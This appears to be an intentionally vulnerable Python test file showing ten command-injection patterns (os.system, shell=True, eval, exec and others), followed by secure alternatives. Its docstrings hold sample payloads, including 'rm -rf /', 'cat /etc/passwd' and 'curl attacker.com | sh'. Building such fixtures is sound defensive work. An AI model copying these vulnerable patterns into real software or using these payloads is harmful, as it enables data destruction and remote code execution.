"""Command Injection Vulnerabilities - INTENTIONALLY VULNERABLE.

This file contains intentionally vulnerable code for testing purposes.
DO NOT use any of this code in production.

Vulnerability: CWE-78 - Improper Neutralization of Special Elements used in an OS Command
OWASP: A03:2021 - Injection
"""

import os
import subprocess
from typing import Any


# Example 1: os.system()
def ping_host_system(hostname: str) -> int:
    """VULNERABLE: os.system() with user input.

    Attack: hostname = "google.com; rm -rf /"
    Result: Command injection
    """
    # BAD: Direct user input to os.system()
    return os.system(f"ping -c 1 {hostname}")


# Example 2: os.popen()
def get_file_info_popen(filename: str) -> str:
    """VULNERABLE: os.popen() with user input.

    Attack: filename = "test.txt; cat /etc/passwd"
    Result: Arbitrary file read
    """
    # BAD: Direct user input to os.popen()
    return os.popen(f"file {filename}").read()


# Example 3: subprocess with shell=True
def run_command_shell_true(cmd: str) -> str:
    """VULNERABLE: subprocess with shell=True and user input.

    Attack: cmd = "ls; rm -rf /"
    Result: Arbitrary command execution
    """
    # BAD: shell=True with user-controlled command
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.stdout


# Example 4: subprocess.Popen with shell=True
def execute_script_popen(script_name: str) -> str:
    """VULNERABLE: Popen with shell=True.

    Attack: script_name = "test.sh; curl attacker.com/malware | sh"
    Result: Remote code execution
    """
    # BAD: shell=True with user input in command string
    proc = subprocess.Popen(
        f"bash {script_name}",
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    stdout, _ = proc.communicate()
    return stdout.decode()


# Example 5: eval() with user input
def calculate_expression(expression: str) -> Any:
    """VULNERABLE: eval() with user input.

    Attack: expression = "__import__('os').system('rm -rf /')"
    Result: Arbitrary code execution
    """
    # BAD: eval() with user input
    return eval(expression)


# Example 6: exec() with user input
def run_user_code(code: str) -> None:
    """VULNERABLE: exec() with user input.

    Attack: code = "import os; os.system('curl attacker.com | sh')"
    Result: Arbitrary code execution
    """
    # BAD: exec() with user input
    exec(code)


# Example 7: os.path injection
def read_log_file(log_name: str) -> str:
    """VULNERABLE: Path traversal via shell command.

    Attack: log_name = "../../../etc/passwd"
    Result: Arbitrary file read
    """
    # BAD: User input in path without validation
    return os.popen(f"cat /var/log/{log_name}").read()


# Example 8: Environment variable injection
def run_with_env(var_name: str, var_value: str) -> str:
    """VULNERABLE: Environment variable injection.

    Attack: var_name = "LD_PRELOAD=/tmp/malicious.so"
    Result: Library injection
    """
    # BAD: User-controlled environment variables
    os.environ[var_name] = var_value
    result = subprocess.run(["some_binary"], capture_output=True, text=True)
    return result.stdout


# Example 9: Format string in shell command
def grep_logs_format(pattern: str, log_file: str) -> str:
    """VULNERABLE: Format string injection in shell command.

    Attack: pattern = "-e . /etc/passwd #"
    Result: Reading arbitrary files
    """
    # BAD: User input directly in command template
    cmd = f"grep '{pattern}' {log_file}"
    return subprocess.check_output(cmd, shell=True, text=True)


# Example 10: Chained commands via semicolon
def backup_file_chained(filename: str) -> int:
    """VULNERABLE: Command chaining possible.

    Attack: filename = "test.txt; rm -rf /"
    Result: Arbitrary command execution
    """
    # BAD: No escaping of special shell characters
    return os.system(f"cp {filename} {filename}.bak")


# SECURE ALTERNATIVES (for comparison)

def ping_host_secure(hostname: str) -> subprocess.CompletedProcess:
    """SECURE: Using subprocess with list arguments."""
    # GOOD: Pass arguments as list, shell=False (default)
    return subprocess.run(
        ["ping", "-c", "1", hostname],
        capture_output=True,
        text=True,
        timeout=10,
    )


def run_command_secure(args: list[str]) -> str:
    """SECURE: Command as list without shell."""
    # GOOD: Arguments as list, no shell interpretation
    result = subprocess.run(
        args,
        capture_output=True,
        text=True,
        shell=False,  # Explicit for clarity
    )
    return result.stdout


import shlex


def grep_logs_secure(pattern: str, log_file: str) -> str:
    """SECURE: Using shlex.quote for escaping."""
    # GOOD: Proper escaping if shell is needed
    safe_pattern = shlex.quote(pattern)
    safe_file = shlex.quote(log_file)

    # Even better: use list form without shell
    result = subprocess.run(
        ["grep", pattern, log_file],
        capture_output=True,
        text=True,
    )
    return result.stdout


import ast


def calculate_expression_secure(expression: str) -> Any:
    """SECURE: Using ast.literal_eval for safe evaluation."""
    # GOOD: Only evaluate literal expressions
    return ast.literal_eval(expression)
